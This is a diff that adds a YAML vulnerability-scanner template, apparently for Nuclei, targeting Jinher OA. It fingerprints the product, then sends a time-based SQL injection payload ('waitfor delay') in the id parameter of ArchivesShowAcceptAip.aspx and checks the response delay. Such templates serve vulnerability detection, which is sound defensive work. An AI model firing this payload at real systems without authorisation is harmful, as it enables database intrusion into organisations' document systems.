@@ -1,0 +1,43 @@
+id: poc-yaml-jinher-archivesshowacceptaip-aspx-sqli
+info:
+  name: 金和OA ArchivesShowAcceptAip SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1,4)}}"
+  t2: "{{to_number(t1) * 4}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.Archives/ArchivesShowAcceptAip.aspx/?id=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "收文信息"
+          - "公文类型"
+          - "秘密等级"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t2) && duration <= to_number(t3)"
